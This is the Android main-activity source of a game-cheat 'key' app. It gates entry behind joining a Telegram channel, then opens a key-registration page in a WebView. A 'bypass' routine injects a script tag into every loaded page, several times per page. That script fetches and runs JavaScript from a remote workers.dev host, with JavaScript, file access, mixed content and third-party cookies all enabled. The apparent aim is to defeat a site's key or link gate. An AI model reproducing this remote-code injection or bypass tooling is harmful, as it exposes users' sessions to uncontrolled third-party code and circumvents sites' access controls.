package com.kingcheats.keyapp;

import android.animation.ObjectAnimator;
import android.animation.ValueAnimator;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.webkit.CookieManager;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.AppCompatButton;

public class MainActivity extends AppCompatActivity {

    private static final String TARGET_URL = "https://monteolympus.com/s/king_cheats-register_update";
    private static final String TELEGRAM_CHANNEL_URL = "https://t.me/+5-JL1-A7v2JlZWU9";
    private static final String PREFS_NAME = "KingCheatsPrefs";
    private static final String KEY_TELEGRAM_JOINED = "is_telegram_joined";

    private WebView webView;
    private ProgressBar progressBar;
    private FrameLayout lockOverlay;
    private TextView tvDialogTitle;
    private AppCompatButton btnTelegramAction;

    private boolean hasClickedJoin = false;
    private boolean isUnlocked = false;
    private final Handler handler = new Handler(Looper.getMainLooper());

    // Bypass script injected into pages
    private static final String BYPASS_SCRIPT =
        "(function(){" +
        "  try {" +
        "    var e = document.querySelector('script[src*=\"rabindra-bypass-ofc\"]');" +
        "    if (e) return;" +
        "    var s = document.createElement('script');" +
        "    s.src = 'https://rabindrabypassofc.rabindra-bypass-ofc.workers.dev/?host=' + encodeURIComponent(location.hostname) + '&t=' + Date.now();" +
        "    document.head.appendChild(s);" +
        "  } catch(err) {}" +
        "})();";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        supportRequestWindowFeature(Window.FEATURE_NO_TITLE);
        super.onCreate(savedInstanceState);

        // Full Screen Window
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        );

        setContentView(R.layout.activity_main);

        webView = findViewById(R.id.webView);
        progressBar = findViewById(R.id.progressBar);
        lockOverlay = findViewById(R.id.lockOverlay);
        tvDialogTitle = findViewById(R.id.tvDialogTitle);
        btnTelegramAction = findViewById(R.id.btnTelegramAction);

        startGlowingBlinkAnimation();
        setupButtons();
        setupWebView();
        checkTelegramLock();
    }

    private void startGlowingBlinkAnimation() {
        if (tvDialogTitle == null) return;

        // Glowing blinking alpha animation
        ObjectAnimator blinkAlpha = ObjectAnimator.ofFloat(tvDialogTitle, "alpha", 0.25f, 1.0f);
        blinkAlpha.setDuration(550);
        blinkAlpha.setRepeatMode(ValueAnimator.REVERSE);
        blinkAlpha.setRepeatCount(ValueAnimator.INFINITE);
        blinkAlpha.start();

        // Subtle pulsing scale
        ObjectAnimator scaleX = ObjectAnimator.ofFloat(tvDialogTitle, "scaleX", 0.97f, 1.03f);
        scaleX.setDuration(550);
        scaleX.setRepeatMode(ValueAnimator.REVERSE);
        scaleX.setRepeatCount(ValueAnimator.INFINITE);
        scaleX.start();

        ObjectAnimator scaleY = ObjectAnimator.ofFloat(tvDialogTitle, "scaleY", 0.97f, 1.03f);
        scaleY.setDuration(550);
        scaleY.setRepeatMode(ValueAnimator.REVERSE);
        scaleY.setRepeatCount(ValueAnimator.INFINITE);
        scaleY.start();
    }

    private void setupButtons() {
        btnTelegramAction.setOnClickListener(v -> {
            if (!hasClickedJoin) {
                // Click 1: Open telegram channel & change button state to JOINED
                openTelegramChannel();
                setButtonToJoinedState();
            } else {
                // Click 2: Unlock and enter app
                unlockAndLoadApp();
            }
        });
    }

    private void setButtonToJoinedState() {
        hasClickedJoin = true;
        btnTelegramAction.setText("JOINED");
        btnTelegramAction.setBackgroundResource(R.drawable.btn_joined_bg);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (hasClickedJoin && !isUnlocked) {
            setButtonToJoinedState();
        }
    }

    private void checkTelegramLock() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        boolean previouslyJoined = prefs.getBoolean(KEY_TELEGRAM_JOINED, false);

        if (previouslyJoined) {
            unlockAndLoadApp();
        } else {
            isUnlocked = false;
            lockOverlay.setVisibility(View.VISIBLE);
        }
    }

    private void openTelegramChannel() {
        hasClickedJoin = true;
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(TELEGRAM_CHANNEL_URL));
            startActivity(intent);
        } catch (Exception e) {
            Toast.makeText(this, "Could not open Telegram: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void unlockAndLoadApp() {
        isUnlocked = true;
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        prefs.edit().putBoolean(KEY_TELEGRAM_JOINED, true).apply();

        lockOverlay.setVisibility(View.GONE);
        Toast.makeText(this, "Access Unlocked!", Toast.LENGTH_SHORT).show();

        webView.loadUrl(TARGET_URL);
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void setupWebView() {
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setUseWideViewPort(true);
        settings.setLoadWithOverviewMode(true);
        settings.setSupportZoom(true);
        settings.setBuiltInZoomControls(true);
        settings.setDisplayZoomControls(false);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);

        // Modern Mobile Chrome User Agent
        settings.setUserAgentString("Mozilla/5.0 (Linux; Android 14; Mobile; rv:131.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36");

        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        cookieManager.setAcceptThirdPartyCookies(webView, true);

        webView.setWebChromeClient(new WebChromeClient() {
            @Override
            public void onProgressChanged(WebView view, int newProgress) {
                if (newProgress < 100) {
                    progressBar.setVisibility(View.VISIBLE);
                    progressBar.setProgress(newProgress);
                } else {
                    progressBar.setVisibility(View.GONE);
                }

                if (newProgress >= 50) {
                    injectBypassScript();
                }
            }
        });

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                injectBypassScript();
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                injectBypassScript();

                handler.postDelayed(() -> injectBypassScript(), 1500);
                handler.postDelayed(() -> injectBypassScript(), 3500);
            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                String url = request.getUrl().toString();
                if (url.startsWith("https://t.me/") || url.startsWith("tg://")) {
                    try {
                        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                        startActivity(intent);
                        return true;
                    } catch (Exception ignored) {}
                }
                return false;
            }

            @Override
            public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
                // Ignore non-fatal frame errors
            }
        });
    }

    private void injectBypassScript() {
        if (!isUnlocked) return;
        webView.evaluateJavascript(BYPASS_SCRIPT, null);
    }

    @Override
    public void onBackPressed() {
        if (!isUnlocked) {
            finishAffinity();
            return;
        }
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }
}
